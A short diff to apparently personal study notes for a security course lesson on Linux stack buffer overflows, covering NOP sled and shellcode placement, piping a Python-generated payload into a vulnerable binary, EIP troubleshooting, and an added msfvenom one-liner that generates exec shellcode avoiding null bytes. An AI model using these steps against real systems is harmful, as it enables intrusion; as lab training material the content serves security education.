@@ -599,7 +599,9 @@ https://sec.cybbh.io/public/security/latest/lessons/lesson-7-exploit_sg.html
     35. change print statement to include nop and buf
     36. then go to linops terminal and run -> ./func <<<$(./lin_buf.py)
 
-    (if it doesnt work, regenerate shell code, change EIP, check print statement, make sure you're just using 'python')
+    (if it doesnt work, regenerate shell code, change EIP, check print statement, make sure you're just using 'python' , on target machine -> put this in /tmp)
+
+    **MSFvenom one liner** 'msfvenom -p linux/x86/exec CMD="whoami && ifconfig" -b '\x00' -f python
     
     
     
